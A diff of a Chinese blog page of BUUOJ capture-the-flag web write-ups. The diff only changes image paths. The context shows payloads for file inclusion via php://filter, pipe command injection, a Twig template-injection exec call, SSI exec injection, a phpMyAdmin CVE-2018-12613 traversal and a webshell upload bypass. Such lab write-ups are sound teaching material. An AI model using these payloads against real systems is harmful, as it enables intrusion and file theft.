@@ -542,13 +542,13 @@
 </li>
 </ul>
 <p>参考：<a href="https://blog.csdn.net/qq_42158602/article/details/103930598" target="_blank" rel="noopener">https://blog.csdn.net/qq_42158602/article/details/103930598</a></p>
-<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200805231904896.png" alt="image-20200805231904896"></p>
+<h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="../../../../medias/img/image-20200805231904896.png" alt="image-20200805231904896"></p>
 <p>由注释可知为<a href="https://xz.aliyun.com/t/2563" target="_blank" rel="noopener">MD5哈希长度拓展攻击</a></p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200805232021063.png" alt="image-20200805232021063"></p>
+<p><img src="../../../../medias/img/image-20200805232021063.png" alt="image-20200805232021063"></p>
 <p>但是响应包已经返回hash，直接get提交参数path=fa25e54758d5d5c1927781a6ede89f8a，提交后重定向404</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200805232331858.png" alt="image-20200805232331858"></p>
+<p><img src="../../../../medias/img/image-20200805232331858.png" alt="image-20200805232331858"></p>
 <p>点击堆栈追踪可看到代码</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200805232412813.png" alt="image-20200805232412813"></p>
+<p><img src="../../../../medias/img/image-20200805232412813.png" alt="image-20200805232412813"></p>
 <p><code>view-source:http://6fae3651-6912-4405-8f69-92344febe91f.node3.buuoj.cn/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php</code> 读取文件</p>
 <pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
@@ -571,21 +571,21 @@
 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
 </code></pre>
 <p>过滤了ls，data，input，没办法命令执行获取当前文件夹下的内容</p>
-<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200807141720931.png" alt="image-20200807141720931"></p>
+<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="../../../../medias/img/image-20200807141720931.png" alt="image-20200807141720931"></p>
 <blockquote>
 <p><a href="http://f86e6a77-36b2-45db-ac74-9ba92c007216.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php" target="_blank" rel="noopener">http://f86e6a77-36b2-45db-ac74-9ba92c007216.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p>
 <p>基本的文件包含</p>
 </blockquote>
 <h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>用bp绕过前端验证，上传一句话，发现php已进黑名单</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200807143831219.png" alt="image-20200807143831219"></p>
+<p><img src="../../../../medias/img/image-20200807143831219.png" alt="image-20200807143831219"></p>
 <p>返回版本为5.6，改后缀为phtml绕过黑名单验证，成功上传，连接后在根目录发现flag</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200807144032276.png" alt="image-20200807144032276"></p>
+<p><img src="../../../../medias/img/image-20200807144032276.png" alt="image-20200807144032276"></p>
 <h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><blockquote>
 <p>命令执行中的<code>|</code></p>
 <p>127.0.0.1 | ls ../../../</p>
 <p>127.0.0.1 | cat ../../../flag</p>
 </blockquote>
-<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200912085834738.png" alt="image-20200912085834738"></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p><img src="../../../../medias/img/image-20200912085834738.png" alt="image-20200912085834738"></p>
 <p>响应头提示<code>select * from 'admin' where password=md5($pass,true)</code></p>
 <p><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">md5注入</a></p>
 <blockquote>
@@ -653,25 +653,25 @@
 <span class="token keyword">echo</span> <span class="token string">"the flag is: "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span></code></pre>
 <p>考察变量覆盖<code>http://2778652f-ca93-4bd4-a661-53f90a9abd3d.node3.buuoj.cn/?yds=flag</code></p>
 <p>第二个foreach将$yds赋值为$flag，然后不设置post和get中的flag参数，就直接退出并返回$yds,也就是赋值的flag</p>
-<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916110059759.png" alt="image-20200916110059759"></p>
+<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="../../../../medias/img/image-20200916110059759.png" alt="image-20200916110059759"></p>
 <p>查看hint</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916110022260.png" alt="image-20200916110022260"></p>
+<p><img src="../../../../medias/img/image-20200916110022260.png" alt="image-20200916110022260"></p>
 <p>获取ip的方式，网上有很多php获取ip的代码，大同小异，很多都获取了xxf和XFF或Client-IP这两个header作为ip，这两个都可以通过header伪造</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916110328359.png" alt="image-20200916110328359"></p>
+<p><img src="../../../../medias/img/image-20200916110328359.png" alt="image-20200916110328359"></p>
 <p>发现ssti</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916110423473.png" alt="image-20200916110423473"></p>
+<p><img src="../../../../medias/img/image-20200916110423473.png" alt="image-20200916110423473"></p>
 <p>获得flag</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916112411831.png" alt="image-20200916112411831"></p>
-<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916153437603.png" alt="image-20200916153437603"></p>
+<p><img src="../../../../medias/img/image-20200916112411831.png" alt="image-20200916112411831"></p>
+<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p><img src="../../../../medias/img/image-20200916153437603.png" alt="image-20200916153437603"></p>
 <p>hint</p>
 <p><code>Why not take a closer look at cookies?</code></p>
 <p>发现ssti</p>
 <p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">学习链接</a></p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916153250680.png" alt="image-20200916153250680"></p>
+<p><img src="../../../../medias/img/image-20200916153250680.png" alt="image-20200916153250680"></p>
 <p>经测试为twig模板</p>
 <pre><code>user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>
 <p>获得flag</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916170823820.png" alt="image-20200916170823820"></p>
+<p><img src="../../../../medias/img/image-20200916170823820.png" alt="image-20200916170823820"></p>
 <h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>访问index.php.swp获取源码</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
     <span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -723,13 +723,13 @@ i<span class="token operator">=</span><span class="token number">0</span>
     i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span></code></pre>
 <p>跑出密码<code>2020666</code></p>
 <p>登录</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916181329097.png" alt="image-20200916181329097"></p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916181253933.png" alt="image-20200916181253933"></p>
+<p><img src="../../../../medias/img/image-20200916181329097.png" alt="image-20200916181329097"></p>
+<p><img src="../../../../medias/img/image-20200916181253933.png" alt="image-20200916181253933"></p>
 <p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">ssi注入</a></p>
 <p>将用户名改为<code>&lt;!--#exec cmd="ls ../"--&gt;</code></p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916181648989.png" alt="image-20200916181648989"></p>
+<p><img src="../../../../medias/img/image-20200916181648989.png" alt="image-20200916181648989"></p>
 <p><code>&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--&gt;</code></p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200916181934904.png" alt="image-20200916181934904"></p>
+<p><img src="../../../../medias/img/image-20200916181934904.png" alt="image-20200916181934904"></p>
 <h1 id="real"><a href="#real" class="headerlink" title="real"></a>real</h1><h1 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h1><p><a href="https://blog.csdn.net/qq_45158261/article/details/107760856" target="_blank" rel="noopener">1</a></p>
 <p><a href="https://blog.csdn.net/qq_33020901/article/details/80829269?https:%252f%252fblog.csdn.net%252fqq_33020901%252farticle%252fdetails%252f80829269" target="_blank" rel="noopener">2</a></p>
 <p>先执行sql语句</p>
@@ -740,14 +740,14 @@ i<span class="token operator">=</span><span class="token number">0</span>
 <blockquote>
 <p>index.php?target=db_sql.php%253f/../../../../../../../../../../../tmp/sess_+之前记录的<br>cookie</p>
 </blockquote>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200812205749337.png" alt="image-20200812205749337"></p>
+<p><img src="../../../../medias/img/image-20200812205749337.png" alt="image-20200812205749337"></p>
 <p>然后写shell</p>
 <blockquote>
 <p>select ‘’ into outfile ‘/var/www/html/1.php’</p>
 </blockquote>
 <p>发现写不了</p>
 <p>原来flag就在PHP info中</p>
-<p><img src="Buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95.assets/image-20200812210315524.png" alt="image-20200812210315524"></p>
+<p><img src="../../../../medias/img/image-20200812210315524.png" alt="image-20200812210315524"></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
